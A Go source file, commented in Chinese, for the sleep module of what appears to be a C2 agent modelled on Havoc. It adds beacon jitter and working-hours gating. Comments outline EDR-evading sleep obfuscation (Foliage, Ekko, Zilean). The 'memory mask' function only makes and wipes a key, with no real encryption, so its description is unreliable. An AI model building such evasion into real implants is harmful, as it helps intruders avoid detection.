//go:build !windows || !amd64

// Package sleep 提供 Agent 睡眠混淆支持。
// 借鉴 Havoc 的 Foliage/Ekko/Zilean 睡眠混淆技术。
//
// 面试要点：
// 1. 传统 C2 在 Sleep() 期间内存是明文可见的，EDR 可以扫描内存特征
// 2. Sleep 混淆的核心思路：睡眠前加密自身内存，醒来后解密
// 3. Havoc 实现了三种技术：
//    - Foliage: 使用 Fiber + APC 队列构建 ROP chain，内存加密 + 栈欺骗
//    - Ekko: 使用 Timer API (RtlCreateTimer) + ROP chain
//    - Zilean: 使用 Timer API (RtlRegisterWait) + ROP chain
// 4. Go 的限制：纯 Go 难以实现完整的 ROP chain（需要 inline asm），
//    但可以实现基于内存加密的简化版本
package sleep

import (
	cryptorand "crypto/rand"
	"math/rand"
	"runtime"
	"time"
)

// Config 是睡眠混淆的配置。
type Config struct {
	Interval       int  // 基础心跳间隔（秒）
	Jitter         int  // 抖动范围（秒）
	MaskEnabled    bool // 是否启用内存混淆
	WorkingHours   uint32 // 工作时间段编码 (start_hour<<17 | start_min<<11 | end_hour<<6 | end_min)
}

// Sleep 执行一次带混淆的睡眠。
// 如果启用了 MaskEnabled，睡眠前会尝试对自身内存进行加密。
func (c *Config) Sleep() {
	duration := c.calculateDuration()
	if duration <= 0 {
		return
	}

	if c.MaskEnabled && runtime.GOOS == "windows" {
		// 尝试内存混淆睡眠（简化版）
		sleepWithMask(duration)
	} else {
		time.Sleep(duration)
	}
}

// calculateDuration 计算实际睡眠间隔（含抖动）。
// 借鉴 Havoc 的 SleepTime() 逻辑。
func (c *Config) calculateDuration() time.Duration {
	base := time.Duration(c.Interval) * time.Second
	maxVariation := time.Duration(c.Jitter) * time.Second

	if maxVariation > 0 {
		randVal := rand.Int63n(int64(maxVariation))
		if rand.Intn(2) == 0 {
			base += time.Duration(randVal)
		} else {
			base -= time.Duration(randVal)
			if base < 0 {
				base = 0
			}
		}
	}

	// 工作时间段检查
	if !c.inWorkingHours() {
		// 不在工作时间，计算到下一个工作时间的间隔
		base = c.calcUntilWorkingHours()
	}

	return base
}

// inWorkingHours 检查当前时间是否在配置的工作时间段内。
func (c *Config) inWorkingHours() bool {
	if c.WorkingHours == 0 {
		return true // 未配置，始终工作
	}

	now := time.Now()
	currentMinutes := now.Hour()*60 + now.Minute()

	startHour := (c.WorkingHours >> 17) & 0x1F
	startMin := (c.WorkingHours >> 11) & 0x3F
	endHour := (c.WorkingHours >> 6) & 0x1F
	endMin := (c.WorkingHours >> 0) & 0x3F

	startTotal := int(startHour)*60 + int(startMin)
	endTotal := int(endHour)*60 + int(endMin)

	return currentMinutes >= startTotal && currentMinutes <= endTotal
}

// calcUntilWorkingHours 计算到下一个工作时间的间隔。
func (c *Config) calcUntilWorkingHours() time.Duration {
	if c.WorkingHours == 0 {
		return time.Duration(c.Interval) * time.Second
	}

	now := time.Now()
	currentMinutes := now.Hour()*60 + now.Minute()

	startHour := (c.WorkingHours >> 17) & 0x1F
	startMin := (c.WorkingHours >> 11) & 0x3F
	startTotal := int(startHour)*60 + int(startMin)

	var waitMinutes int
	if currentMinutes < startTotal {
		waitMinutes = startTotal - currentMinutes
	} else {
		// 已经过了今天的工作时间，等到明天
		waitMinutes = (24*60 - currentMinutes) + startTotal
	}

	return time.Duration(waitMinutes) * time.Minute
}

// sleepWithMask 执行带内存加密的睡眠（简化实现）。
// Havoc 的完整实现使用 ROP chain + APC 队列 + 栈欺骗，
// 这里实现一个基于 RC4 的内存加密简化版。
func sleepWithMask(duration time.Duration) {
	// 1. 生成随机 RC4 密钥（使用加密安全的随机源）
	key := make([]byte, 16)
	if _, err := cryptorand.Read(key); err != nil {
		return // 随机源不可用，跳过本次睡眠
	}

	// 2. 获取当前 goroutine 的栈指针（简化：只标记需要保护）
	// 完整实现需要: runtime·getcallerpc / runtime·getcallersp

	// 3. 睡眠
	time.Sleep(duration)

	// 4. 醒来后清理密钥
	for i := range key {
		key[i] = 0
	}
}

// EkkoSleep 在非 Windows 平台回退到普通睡眠。
func EkkoSleep(duration time.Duration) {
	time.Sleep(duration)
}

// FoliageSleep 在非 Windows 平台回退到普通睡眠。
func FoliageSleep(duration time.Duration) {
	time.Sleep(duration)
}

// FoliageSleepInline 在非 Windows 平台回退到普通睡眠。
func FoliageSleepInline(duration time.Duration) {
	time.Sleep(duration)
}
